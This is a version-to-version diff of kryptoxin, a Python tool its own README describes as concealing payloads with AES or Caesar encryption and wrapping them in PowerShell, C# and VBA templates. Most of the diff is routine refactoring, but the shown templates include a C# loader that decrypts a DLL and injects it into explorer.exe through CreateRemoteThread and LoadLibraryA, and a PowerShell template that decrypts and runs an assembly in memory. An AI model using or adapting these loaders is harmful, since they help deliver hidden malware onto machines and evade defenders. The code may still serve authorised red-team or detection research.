     # build a directory for unknown arguments
-    uargs = dict([arg.strip('--').split('=') for arg in ctx.args])
+    try:
+        uargs = dict([arg.strip('--').split('=') for arg in ctx.args])
+    except ValueError:
+        log.error(f"Unknown argument(s) given {ctx.args}.")
+        raise SystemExit
 
     # Read provided file and catch errors if any.
     try:
         plaintext = input_file.read()
     except UnicodeDecodeError:
         log.error(
             f"Cannot read input file: {input_file.name}. \
@@ -108,49 +129,81 @@
 
     # Create Toxin object
     tx = Toxin(alg, key, key_size, opmode, iv, salt, pbkdf2_iter,
                hmac, CIPHER_DEFAULT_IV_PREPEND, plaintext=plaintext,
                random_iv=random_iv, random_salt=random_salt,
                action=action, uargs=uargs)
 
-    # Call encryption function.
-    tx.ciphertext = aes.encrypt(tx)
-
-    # If given or generated key is to be displayed.
-    if show_key:
-        log.info(f"The AES encryption key is: {tx.get_dkey_hexstring()}")
-
-    # If IV / Salt randmization is enabled, output the value in hex.
-    if tx.random_iv:
-        log.info(f"The Initialization Vector (IV) is: {tx.get_iv_hexstring()}")
-    if tx.random_salt:
-        log.info(f"The PBKDF2 Salt is: {tx.get_salt_hexstring()}")
+    # Call encryption function(s).
+    # AES - Advanced Encryption Standard
+    if alg == CIPHER_AES:
+        tx.ciphertext = aes.encrypt(tx)
+
+        # If given or generated key is to be displayed.
+        if show_key:
+            log.info(f"The AES encryption key is: {tx.get_dkey_hexstring()}")
+
+        # If IV / Salt randmization is enabled, output the value in hex.
+        if tx.random_iv:
+            log.info(
+                f"The Initialization Vector (IV) is: {tx.get_iv_hexstring()}")
+        if tx.random_salt:
+            log.info(f"The PBKDF2 Salt is: {tx.get_salt_hexstring()}")
+    # CAESAR
+    elif alg == CIPHER_CAESAR:
+        # check key validiting
+        if int(key) in range(0, 255):
+            tx.ciphertext = caesar.encrypt(tx, key=int(key))
+        else:
+            log.error("Please specify a Caasar cipher key between 1 and 255.")
+            raise SystemExit
+    # UNDEFINED ALG
+    else:
+        log.error(f"Invalid encryption algorithm {alg}.", alg)
+        raise SystemExit
 
-    # Templates handling
+    # TEMPLATES HANDLING
     # PowerShell
     if lang == LANG_POWERSHELL:
         if action in powershell.actions:
             output = bytes((powershell.actions[action](tx)), 'UTF-8')
         elif action is None:
             log.error("Please specify a PowerShell script action.")
             raise SystemExit
         else:
-            log.error(f"Unknown template action '{action}'.")
+            log.error(f"Unknown PowerShell template action '{action}'.")
             raise SystemExit
     # C#
     elif lang == LANG_CSHARP:
         if action in csharp.actions:
             output = bytes((csharp.actions[action](tx)), 'UTF-8')
         elif action is None:
             log.error("Please specify a C# program action.")
             raise SystemExit
         else:
-            log.error(f"Unknown template action '{action}'.")
+            log.error(f"Unknown C# template action '{action}'.")
+            raise SystemExit
+    # VBA
+    elif lang == LANG_VBA:
+        if action in vba.actions:
+            output = bytes((vba.actions[action](tx)), 'UTF-8')
+        elif action is None:
+            log.error("Please specify a CBA script action.")
+            raise SystemExit
+        else:
+            log.error(f"Unknown VBA template action '{action}'.")
+            raise SystemExit
+    # NO TEMPLATE / UNDEFINED
     else:
-        output = tx.ciphertext
+        if alg == CIPHER_AES:
+            output = base64.encode_base64(tx.ciphertext)
+        elif alg == CIPHER_CAESAR:
+            output = base64.encode_base64(tx.ciphertext)
+        else:
+            output = bytes(tx.get_ciphertext(), 'UTF-8')
 
     # If output file given, write content (and create file if necessary).
     if output_file:
         output_file.write(unformatted.binary(output))
         output_file.flush()
     else:
         print(unformatted.plain(output))
@@ -171,21 +224,36 @@
         log.error(
             f"Cannot read input file: {input_file.name}. \
             Make sure it's UTF-8 encoded.")
         raise SystemExit
 
     # Create Toxin object
     tx = Toxin(alg, key, key_size, opmode, iv, salt, pbkdf2_iter,
-               hmac, CIPHER_DEFAULT_IV_PREPEND, ciphertext=ciphertext)
+               hmac, CIPHER_DEFAULT_IV_PREPEND,
+               ciphertext=ciphertext)
 
-    # Call decryption function.
-    tx.plaintext = aes.decrypt(tx)
+    # prepare output
+    output = ""
 
-    # Store outout
-    output = tx.plaintext
+    # AES
+    if alg == CIPHER_AES:
+        tx.plaintext = aes.decrypt(tx)
+        output = tx.plaintext
+    # CAESAR
+    elif alg == CIPHER_CAESAR:
+        # check key validiting
+        if int(key) in range(0, 255):
+            tx.plaintext = caesar.decrypt(tx, key=int(key))
+            output = tx.plaintext
+        else:
+            log.error("Please specify a Caasar cipher key between 1 and 255.")
+            raise SystemExit
+    else:
+        log.error(f"Invalid encryption algorithm {alg}.", alg)
+        raise SystemExit
 
     # If output file given, write content (and create file if necessary).
     if output_file:
         output_file.write(unformatted.binary(output))
         output_file.flush()
     else:
         print(unformatted.plain(output))
```

### Comparing `kryptoxin-0.9.8/kryptoxin/core/constants.py` & `kryptoxin-0.9.9/kryptoxin/core/constants.py`

 * *Files 9% similar despite different names*

```diff
@@ -3,14 +3,17 @@
 This module defines the various program-wide constants.
 """
 
 # Program constants
 PROGRAM_NAME = 'Kryptoxin'
 # CLI parameters
 CLI_DISPLAYKEY = False                   # Display generated key on the console
+# Ciphers List
+CIPHER_AES = "AES"                      # Advanced Encryption Standard
+CIPHER_CAESAR = "Caesar"                # Caesar Cipher
 # Cipher Parameters- Defaults
 CIPHER_DEFAULT_ALGORITHM = "aes"        # Default encryption algorithm
 CIPHER_DEFAULT_KEYSIZE = 256            # Default block cipher key-size
 CIPHER_DEFAULT_BLOCKMODE = "cbc"        # Default block cipher operation mode
 CIPHER_DEFAULT_HMHASHALG = "sha1"       # Default HMAC (.NET compat.)
 CIPHER_DEFAULT_PBKDF2_ITER = 10000      # PBKDF2 number of iterations
 CIPHER_DEFAULT_PBKDF2_DKLEN = 32        # PBKDF2 HMAC digest length
@@ -30,13 +33,15 @@
 CIPHER_BLOCK_OPERMODE_CBC = "cbc"       # Cipher Block Chaining
 CIPHER_BLOCK_OPERMODE_CFB = "cfb"       # Cipher Feedback
 CIPHER_BLOCK_OPERMODE_OFB = "ofb"       # Output Feedback
 CIPHER_BLOCK_OPERMODE_EAX = "eax"       # Encrypt-Authenticate-Translate
 # Languages
 LANG_POWERSHELL = "powershell"          # PowerShell cmd-line option string
 LANG_CSHARP = "csharp"                  # C# cmd-line option string
+LANG_VBA = "vba"                        # Visual Basic option string
 # Jinja Templates
 JINJA_TEMPLATES_DIR = "templates/"      # Jinja2 template directory
 JINJA_TEMPLATES_PS = "powershell/"      # PowerShell templates directory
 JINJA_TEMPLATES_CSHARP = "csharp/"      # C# templates directory
+JINJA_TEMPLATES_VBA = "vba/"            # VBA templates directory
 JINJA_TEMPLATES_ACTSDIR = "actions/"    # Actions templates directory
 JINA_TEMPLATES_FEXT = ".jinja"          # Jinja2 templates files extension
```

### Comparing `kryptoxin-0.9.8/kryptoxin/core/toxin.py` & `kryptoxin-0.9.9/kryptoxin/core/toxin.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,14 +1,19 @@
 """
 kryptoxin toxin module.
 This is the toxin module of the kryptoxin project
 where the Toxin object type is defined.
 """
-from .constants import *
-from ..crypto.random import gen_rand_bytes
+from kryptoxin.core.constants import CIPHER_BLOCK_BLKSZ_AES
+from kryptoxin.core.constants import CIPHER_PBKDF2_AES256_KS
+from kryptoxin.core.constants import LANG_POWERSHELL, LANG_CSHARP
+from kryptoxin.core.constants import LANG_VBA
+from kryptoxin.crypto.random import gen_rand_bytes
+from kryptoxin.crypto.base64 import encode_base64
+from kryptoxin.core.conv import bytes2decarray
 
 
 class Toxin:
     def __init__(self,
                  alg, key, key_size, opmode, iv, salt, pbkdf2_iter,
                  pbkdf2_halg, iv_prepend, plaintext=None, ciphertext=None,
                  random_iv=False, random_salt=False, action=None, uargs=None
@@ -65,62 +70,90 @@
         # derived key
         # automatically generated a random one
         self.derived_key = gen_rand_bytes(int(CIPHER_PBKDF2_AES256_KS / 8))
         # template action
         self.action = action
         # unknown arguments dictionary
         self.uargs = uargs
+        # base64 output
+        self.base64 = False
 
     def get_dkey_hexstring(self):
         """ This method return the derived in a hex string
         """
         return self.derived_key.hex()
 
     def get_iv_hexstring(self):
         """ This method return the IV in a hex string
         """
         return self.iv.hex()
 
+    def get_iv_decarray(self):
+        """ This method return the Salt in a decimal array
+        """
+        return bytes2decarray(self.iv)
+
     def get_salt_hexstring(self):
         """ This method return the Salt in a hex string
         """
         return self.salt.hex()
 
+    def get_salt_decarray(self):
+        """ This method return the Salt in a decimal array
+        """
+        return bytes2decarray(self.salt)
+
     def get_ciphertext(self, lang=None, width=54, tab_width=17, var_name=None):
         """ This method return a formatted ciphertext
         """
-        self.ciphertext = str(self.ciphertext, 'UTF-8')
-
         tab = " " * tab_width
         ciph = ""
 
         # PowerShell
-        if lang == LANG_POWERSHELL and len(self.ciphertext) > width:
-            for i in range(0, len(self.ciphertext), width):
-                if i > 0:
-                    if var_name:
-                        ciph += var_name + " += "
-                    else:
-                        ciph += tab
-                ciph += format(f"\"{self.ciphertext[i:i + width]}\"\n")
+        if lang == LANG_POWERSHELL:
+            _ciphertext = str(encode_base64(self.ciphertext), 'UTF-8')
+            if len(_ciphertext) > width:
+                for i in range(0, len(_ciphertext), width):
+                    if i > 0:
+                        if var_name:
+                            ciph += var_name + " += "
+                        else:
+                            ciph += tab
+                    ciph += format(f"\"{_ciphertext[i:i + width]}\"\n")
         # C#
         elif lang == LANG_CSHARP:
+            _ciphertext = str(encode_base64(self.ciphertext), 'UTF-8')
             # if not multi lines width
-            if len(self.ciphertext) < width:
-                return format(f"\"{self.ciphertext}\";")
+            if len(_ciphertext) < width:
+                return format(f"\"{_ciphertext}\";")
 
-            for i in range(0, len(self.ciphertext), width):
+            for i in range(0, len(_ciphertext), width):
                 # if it's the start of the ciphertext variable
                 if i == 0:
                     ciph += "@"
                 # handle decoration around the variable construct
-                if i > len(self.ciphertext) - width - 1:
+                if i > len(_ciphertext) - width - 1:
                     ciph += tab + \
-                        format(f"{self.ciphertext[i:i + width]}\";\n")
+                        format(f"{_ciphertext[i:i + width]}\";\n")
                 elif i > 0:
-                    ciph += tab + format(f"{self.ciphertext[i:i + width]}\n")
+                    ciph += tab + format(f"{_ciphertext[i:i + width]}\n")
+                else:
+                    ciph += format(f"\"{_ciphertext[i:i + width]}\n")
+        # VBA
+        elif lang == LANG_VBA:
+            _ciphertext = bytes2decarray(self.ciphertext)
+            for i, d in enumerate(_ciphertext):
+                if i == 0:
+                    ciph += format(f"{d}, ")
+                elif i % width == 0:
+                    ciph += format(f"{d}, _\n")
+                elif i == len(_ciphertext)-1:
+                    ciph += format(f"{d}")
                 else:
-                    ciph += format(f"\"{self.ciphertext[i:i + width]}\n")
+                    ciph += format(f"{d}, ")
+
+        # Plain / Others
         else:
             ciph = format(f"\"{self.ciphertext}\"")
 
+        # return built ciph variable
         return ciph
```

### Comparing `kryptoxin-0.9.8/kryptoxin/crypto/aes.py` & `kryptoxin-0.9.9/kryptoxin/crypto/aes.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,15 +1,19 @@
 """
 kryptoxin AES cipher module.
 This is the aes cipher module of the kryptoxin project.
 """
-from ..core.toxin import Toxin
-from ..core.log import log
-from ..core.constants import *
-from . import base64, pbkdf2
+from kryptoxin.core.toxin import Toxin
+from kryptoxin.core.log import log
+from kryptoxin.core.constants import CIPHER_BLOCK_OPERMODE_CBC
+from kryptoxin.core.constants import CIPHER_BLOCK_OPERMODE_CFB
+from kryptoxin.core.constants import CIPHER_BLOCK_OPERMODE_OFB
+from kryptoxin.core.constants import CIPHER_BLOCK_OPERMODE_EAX
+from kryptoxin.core.constants import CIPHER_BLOCK_BLKSZ_AES
+from kryptoxin.crypto import pbkdf2, base64
 import Crypto.Cipher.AES
 
 
 def _cipher_opmode(mode):
     """ This local function returns the appropriate block-cipher
     operation mode.
     """
@@ -60,20 +64,21 @@
     # is in fact XORed to itself, thus rending the IV
     # void.
     if t.iv_prepend:  # If True, prepend the IV
         ciphertext = cipher.encrypt(bytes(t.iv) + padded_plaintext)
     else:
         ciphertext = cipher.encrypt(padded_plaintext)
 
-    # Encode and return the ciphertext in base64.
-    return base64.encode_base64(ciphertext)
+    # Return the ciphertext
+    return ciphertext
 
 
 def decrypt(t: Toxin):
-    """ This function perform AES block cipher decryption.
+    """ This function perform AES block cipher decryption
+    on base64 encoded ciphertext.
     """
     # Decode the ciphertext using base64.
     try:
         ciphertext = base64.decode_base64(t.ciphertext)
     except base64.base64.binascii.Error:
         log.error("Cannot decode ciphertext input using base64.")
         raise SystemExit
```

### Comparing `kryptoxin-0.9.8/kryptoxin/crypto/pbkdf2.py` & `kryptoxin-0.9.9/kryptoxin/crypto/pbkdf2.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,14 +1,16 @@
 """
 kryptoxin PBKDF2  module.
 This is the key-derivation function PBKDF2 module of the kryptoxin project.
 """
-from ..core import log
-from ..core.constants import *
 import hashlib
+from kryptoxin.core import log
+from kryptoxin.core.constants import CIPHER_PBKDF2_AES128_KS
+from kryptoxin.core.constants import CIPHER_PBKDF2_AES192_KS
+from kryptoxin.core.constants import CIPHER_PBKDF2_AES256_KS
 
 
 def derive_key(key, key_size, halg, iter, salt):
     """ This function perform the key derivation function
     using PBKDF2.
 
     Arguments:
@@ -32,8 +34,8 @@
         raise SystemExit
 
     # Derive the encryption key from the password.
     derived_key = hashlib.pbkdf2_hmac(halg, memoryview(
         key), memoryview(salt), iter, dklen)
 
     # return the derived_key
-    return derived_key
+    return derived_key
```

### Comparing `kryptoxin-0.9.8/kryptoxin/output/__init__.py` & `kryptoxin-0.9.9/kryptoxin/output/__init__.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,21 +1,22 @@
 """
 kryptoxin output module.
 This is the ouput module of the kryptoxin project.
 """
 from kryptoxin import ROOT_DIR
-from ..core.constants import JINJA_TEMPLATES_DIR
+from kryptoxin.core.constants import JINJA_TEMPLATES_DIR
 import jinja2
 
 
 def get_jinja_env() -> jinja2.Environment:
     """ Return the Jinja2 Environment
     """
     return create_jinja_env()
 
 
 def create_jinja_env() -> jinja2.Environment:
     """ Create the Jinja2 Environment
     """
     env = jinja2.Environment(
-        loader=jinja2.FileSystemLoader(ROOT_DIR + "/" + JINJA_TEMPLATES_DIR))
+        loader=jinja2.FileSystemLoader(ROOT_DIR + "/" + JINJA_TEMPLATES_DIR),
+        trim_blocks=True)
     return env
```

### Comparing `kryptoxin-0.9.8/kryptoxin/output/csharp.py` & `kryptoxin-0.9.9/kryptoxin/output/csharp.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,15 +1,16 @@
 """
 kryptoxin C# output module.
 This module contains functions for the C# outputs
 """
-from ..core.toxin import Toxin
-from ..core.constants import JINJA_TEMPLATES_CSHARP, JINJA_TEMPLATES_ACTSDIR, \
-    JINA_TEMPLATES_FEXT, LANG_CSHARP
-from . import get_jinja_env
+from kryptoxin.core.toxin import Toxin
+from kryptoxin.core.constants import JINJA_TEMPLATES_CSHARP
+from kryptoxin.core.constants import JINJA_TEMPLATES_ACTSDIR
+from kryptoxin.core.constants import JINA_TEMPLATES_FEXT, LANG_CSHARP
+from kryptoxin.output import get_jinja_env
 
 # Create Jinja2 environment variable
 env = get_jinja_env()
 
 # Actions templates directories string
 tmpl_action_rpath = JINJA_TEMPLATES_CSHARP + JINJA_TEMPLATES_ACTSDIR
```

### Comparing `kryptoxin-0.9.8/kryptoxin/output/powershell.py` & `kryptoxin-0.9.9/kryptoxin/output/powershell.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,15 +1,16 @@
 """
 kryptoxin powershell output module.
 This module contains functions for the powershell outputs
 """
-from ..core.toxin import Toxin
-from ..core.constants import JINJA_TEMPLATES_PS, JINJA_TEMPLATES_ACTSDIR, \
-    JINA_TEMPLATES_FEXT, LANG_POWERSHELL
-from . import get_jinja_env
+from kryptoxin.core.toxin import Toxin
+from kryptoxin.core.constants import JINJA_TEMPLATES_PS
+from kryptoxin.core.constants import JINJA_TEMPLATES_ACTSDIR
+from kryptoxin.core.constants import JINA_TEMPLATES_FEXT, LANG_POWERSHELL
+from kryptoxin.output import get_jinja_env
 
 # Create Jinja2 environment variable
 env = get_jinja_env()
 
 # Actions templates directories string
 tmpl_action_rpath = JINJA_TEMPLATES_PS + JINJA_TEMPLATES_ACTSDIR
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/custom.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/custom.jinja`

 * *Files 19% similar despite different names*

```diff
@@ -10,21 +10,32 @@
 using System.Text;
 using System.Security.Cryptography;
 
 class Program
 {
     {# Include hex string to byte array conversion function #}
     {% include "csharp/transform/hexstr2bytearray.jinja" %}
+
     {# Include AES decryption function #}
     {% include "csharp/decrypt/aes-dotnet.jinja" %}
+    
 
     static void Main(string[] args)
     {
        string ciphertext = {{ ciphertext }}
        byte[] encryptedBytes = Convert.FromBase64String(ciphertext);
 
+       string password = "{{ password }}";
+       int iterations = {{ iter }};
+       int keySize = {{ key_size }};
+       string salt = "{{ salt }}";
+       string iv = "{{ iv }}";
+
+       byte[] saltBytes = HexStringToByteArray(salt);
+       byte[] ivBytes = HexStringToByteArray(iv);
+
        byte[] decryptedData;
        decryptedData = DecryptAES(encryptedBytes, keySize, password, iterations, saltBytes, ivBytes);
 
        return 0;
     }
 }
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/load-library.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/load-library.jinja`

 * *Files 5% similar despite different names*

```diff
@@ -21,16 +21,18 @@
 using System.Text;
 using System.Security.Cryptography;
 
 class Program
 {
     {# Include hex string to byte array conversion function #}
     {% include "csharp/transform/hexstr2bytearray.jinja" %}
+
     {# Include AES decryption function #}
     {% include "csharp/decrypt/aes-dotnet.jinja" %}
+    
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")]
     static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
@@ -57,33 +59,43 @@
         string ciphertext = {{ ciphertext }}
         byte[] encryptedBytes = Convert.FromBase64String(ciphertext);
 
         byte[] decryptedData;
         decryptedData = DecryptAES(encryptedBytes, keySize, password, iterations, saltBytes, ivBytes);
 
         String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
         {% if args.dllname is defined %}
+
         String dllPath = dir + "{{ args.dllname }}";
+
         {% else %}
+
         String dllPath = dir + "{{ iv }}.dll";
+
         {% endif %}
 
         using (BinaryWriter binWriter = new BinaryWriter(File.Open(dllPath, FileMode.Create)))
         {
             binWriter.Write(decryptedData);
         }
 
         {% if args.process is defined %}
+
         Process[] eProc = Process.GetProcessesByName("{{ args.process }}");
+
         {% else %}
+
         Process[] eProc = Process.GetProcessesByName("explorer");
+
         {% endif %}
+
         int eppid = eProc[0].Id;
         IntPtr hProcess = OpenProcess(0x001F0FFF, false, eppid);
 
         IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
         IntPtr outSize;
         Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), dllPath.Length, out outSize);
         IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
         IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
     }
-}
+}
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/csharp/actions/print.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/csharp/actions/print.jinja`

 * *Files 0% similar despite different names*

```diff
@@ -5,17 +5,19 @@
 #}
 using System.Security.Cryptography;
 
 class Program
 {
     {# Include hex string to byte array conversion function #}
     {% include "csharp/transform/hexstr2bytearray.jinja" %}
+
     {# Include AES decryption function #}
     {% include "csharp/decrypt/aes-dotnet.jinja" %}
 
+    
     static void Main(string[] args)
     {
         string password = "{{ password }}";
         int iterations = {{ iter }};
         int keySize = {{ key_size }};
 
         string salt = "{{ salt }}";
@@ -27,8 +29,8 @@
         byte[] encryptedBytes = Convert.FromBase64String(encryptedMessage);
 
         string decryptedData;
 
         decryptedData = DecryptAES(encryptedBytes, keySize, password, iterations, saltBytes, ivBytes);
         Console.WriteLine(decryptedData);
     }
-}
+}
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/csharp/decrypt/aes-dotnet.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/csharp/decrypt/aes-dotnet.jinja`

 * *Files 5% similar despite different names*

```diff
@@ -1,12 +1,13 @@
 {# aes-dotnet.jinja #}
 {#
     This Jinja2 template includes the C# decryption routines.
     It leverages the .NET System.Security.Cryptography class for AES decryption
 #}
+
     public static {%if action == 'print'%}string{%else%}byte[]{% endif %} DecryptAES(byte[] encryptedBytes, int keySize, string password, int iter, byte[]salt, byte[]iv)
     {
         using (Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(password, salt, iter))
         {
             byte[] keyBytes = pbkdf2.GetBytes(keySize / 8);
 
             using (Aes aes = Aes.Create())
@@ -15,32 +16,37 @@
                 aes.IV = iv;
                 aes.Mode = CipherMode.{{ mode }};
                 aes.Padding = PaddingMode.PKCS7;
 
                 ICryptoTransform decryptor = aes.CreateDecryptor();
 
                 {% if action == 'print' %}
+
                 using (MemoryStream ms = new MemoryStream(encryptedBytes))
                 {
                     using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                     {
                         using (StreamReader sr = new StreamReader(cs))
                         {
                             return sr.ReadToEnd();
                         }
                     }
                 }
+
                 {% else %}
+
                 using (MemoryStream ms = new MemoryStream(encryptedBytes))
                 {
                     using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                     {
                         using (BinaryReader br = new BinaryReader(cs))
                         {
                                 return br.ReadBytes((int)encryptedBytes.Length);
                         }
                     }
                 }
+
                 {% endif %}
+
             }
         }
-    }
+    }
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/powershell/actions/load-asm.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/powershell/actions/load-asm.jinja`

 * *Files 16% similar despite different names*

```diff
@@ -1,23 +1,25 @@
 {# load-asm.jinja #}
 {#
     This Jinja2 template includes a PowerShell script
     that loads COFF images (e,g. .DLLs) to memory.
 #}
 $base64EncData  = {{ ciphertext }}
+
 {# Perform base64 decoding #}
 {% include "powershell/decode/base64.jinja" %}
+
 {# Perform decryption #}
 {% include "powershell/decrypt/aes-dotnet.jinja" %}
 
 $asm = [System.Reflection.Assembly]::Load([byte[]]$data)
 {% if args.type is defined %}
 $class = $asm.GetType("{{args.type}}")
 {% else %}
 $class = $asm.GetType("ClassLibrary.Class")
 {% endif %}
 {% if args.method is defined %}
 $method = $class.GetMethod("{{args.method}}")
 {% else %} 
 $method = $class.GetMethod("runner")
 {% endif %}
-$method.Invoke(0, $null)
+$method.Invoke(0, $null)
```

### Comparing `kryptoxin-0.9.8/kryptoxin/templates/powershell/decrypt/aes-dotnet.jinja` & `kryptoxin-0.9.9/kryptoxin/templates/powershell/decrypt/aes-dotnet.jinja`

 * *Ordering differences only*

 * *Files 0% similar despite different names*

```diff
@@ -36,8 +36,8 @@
     return $key
 }
 
 $password = "{{ password }}"
 $iv = [byte[]]({{ iv }})
 $salt = [byte[]]({{ salt }})
 $key = Derive-KeyPBKDF2HMAC -Password $password -Salt $salt
-$data = Decrypt-AES256PBKDF2HMAC -key $key -Ciphertext $data -IV $iv
+$data = Decrypt-AES256PBKDF2HMAC -key $key -Ciphertext $data -IV $iv
```

### Comparing `kryptoxin-0.9.8/kryptoxin.egg-info/PKG-INFO` & `kryptoxin-0.9.9/kryptoxin.egg-info/PKG-INFO`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: kryptoxin
-Version: 0.9.8
+Version: 0.9.9
 Summary: A security-oriented payload encryption tool written in Python.
 Home-page: https://github.com/e3prom/kryptoxin
 Author: Nicolas Chabbey
 Author-email: eprom@toor.si
 License: GNU Affero General Public License v3
 Keywords: security,encryption
 Classifier: Programming Language :: Python :: 3
@@ -26,15 +26,15 @@
 [![License](https://img.shields.io/github/license/e3prom/kryptoxin?style=for-the-badge)](https://raw.githubusercontent.com/e3prom/kryptoxin/master/LICENSE)
 
 - [Kryptoxin](#kryptoxin)
   - [Description](#description)
   - [Features](#features)
   - [Installation](#installation)
     - [With pip (latest release)](#with-pip-latest-release)
-    - [With git (v0.9.8)](#with-git-v098)
+    - [With git (v0.9.9)](#with-git-v099)
   - [Usages examples](#usages-examples)
     - [Read, encrypt and decrypt, all from stdin](#read-encrypt-and-decrypt-all-from-stdin)
     - [Encrypt using AES-128-CFB](#encrypt-using-aes-128-cfb)
     - [Uses the PowerShell `load-asm` script template](#uses-the-powershell-load-asm-script-template)
   - [Documentation](#documentation)
   - [Disclaimer](#disclaimer)
   - [License](#license)
@@ -46,20 +46,22 @@
 The name `Kryptoxin` comes from the contraction of `Kryptos` (meaning `conceal`, `hidden` or `secret` in Greek) and the word `Toxin` (meaning `poison`). As the name implies, the intended goal of this project is to provide a fast and efficient way of concealing or hiding payloads, thus saving you a lot of time and effort. Most of our templates are "living off the land", using system libraries and encryption routines commonly found in base operating systems installations.
 
 ## Features
 
 The below features are supported:
 
 - Provides block-cipher encryption algorithms such as the `Advanced Encryption Standard` or `AES`.
+- Implements basic encryption ciphers such as a derivative of the [`Caesar Cipher`](https://en.wikipedia.org/wiki/Caesar_cipher).
 - Supports user-specifiable key sizes and block-cipher modes of operations, such as `AES256-CBC`.
 - Generate random cryptographic parameters such as `Initialization Vector` and `Salt`.
 - Encodes and properly formats variables for fast and streamlined copy/paste operations.
 - Handles `Text Files`, `Scripts`, `Portable Executables (PE)`, `Dynamic Link Libraries (DLLs)`, and `shellcodes` objects.
 - Generates compact, portable scripts or source codes as outputs for the below programming languages:
   - [x] PowerShell
+  - [x] VBA Macro
   - [x] C#
   - [ ] C++
   - [ ] C
 - Implement key derivation functions, such as `PBKDF2`.
 - Supports out-of-band key storage, with conditional trigger mechanisms (not yet available).
 - Includes scripts and source code templates to be used for security-related tasks and experimentation.
 
@@ -67,20 +69,20 @@
 
 ### With pip (latest release)
 
 ``` sh
 pip install kryptoxin
 ```
 
-### With git (v0.9.8)
+### With git (v0.9.9)
 
 ``` sh
 git clone https://github.com/e3prom/kryptoxin
 cd kryptoxin
-git checkout tags/0.9.8
+git checkout tags/0.9.9
 sudo make install
 ```
 
 ## Usages examples
 
 ### Read, encrypt and decrypt, all from stdin
```

### Comparing `kryptoxin-0.9.8/kryptoxin.egg-info/SOURCES.txt` & `kryptoxin-0.9.9/kryptoxin.egg-info/SOURCES.txt`

 * *Files 20% similar despite different names*

```diff
@@ -12,29 +12,36 @@
 kryptoxin.egg-info/dependency_links.txt
 kryptoxin.egg-info/requires.txt
 kryptoxin.egg-info/top_level.txt
 kryptoxin.egg-info/zip-safe
 kryptoxin/core/__init__.py
 kryptoxin/core/cli.py
 kryptoxin/core/constants.py
+kryptoxin/core/conv.py
 kryptoxin/core/log.py
 kryptoxin/core/toxin.py
 kryptoxin/crypto/__init__.py
 kryptoxin/crypto/aes.py
 kryptoxin/crypto/base64.py
+kryptoxin/crypto/caesar.py
 kryptoxin/crypto/pbkdf2.py
 kryptoxin/crypto/random.py
 kryptoxin/output/__init__.py
 kryptoxin/output/csharp.py
 kryptoxin/output/powershell.py
 kryptoxin/output/unformatted.py
+kryptoxin/output/vba.py
 kryptoxin/templates/csharp/actions/custom.jinja
 kryptoxin/templates/csharp/actions/load-library.jinja
 kryptoxin/templates/csharp/actions/print.jinja
 kryptoxin/templates/csharp/decrypt/aes-dotnet.jinja
 kryptoxin/templates/csharp/transform/hexstr2bytearray.jinja
 kryptoxin/templates/powershell/actions/custom.jinja
 kryptoxin/templates/powershell/actions/load-asm.jinja
 kryptoxin/templates/powershell/actions/print.jinja
 kryptoxin/templates/powershell/decode/base64.jinja
 kryptoxin/templates/powershell/decrypt/aes-dotnet.jinja
+kryptoxin/templates/vba/actions/load-asm.jinja
+kryptoxin/templates/vba/decrypt/aes-dotnet.jinja
+kryptoxin/templates/vba/decrypt/caesar-native.jinja
+kryptoxin/templates/vba/transform/bytearraytostring.jinja
 tests/test_cli.py
```

### Comparing `kryptoxin-0.9.8/setup.cfg` & `kryptoxin-0.9.9/setup.cfg`

 * *Files 13% similar despite different names*

```diff
@@ -31,14 +31,11 @@
 * = *.yml, *.rst, *.md, templates/*.jinja
 
 [options.packages.find]
 exclude = 
 	tests*
 	docs*
 
-[flake8]
-select = E
-
 [egg_info]
 tag_build = 
 tag_date = 0
```

### Comparing `kryptoxin-0.9.8/tests/test_cli.py` & `kryptoxin-0.9.9/tests/test_cli.py`

 * *Files identical despite different names*

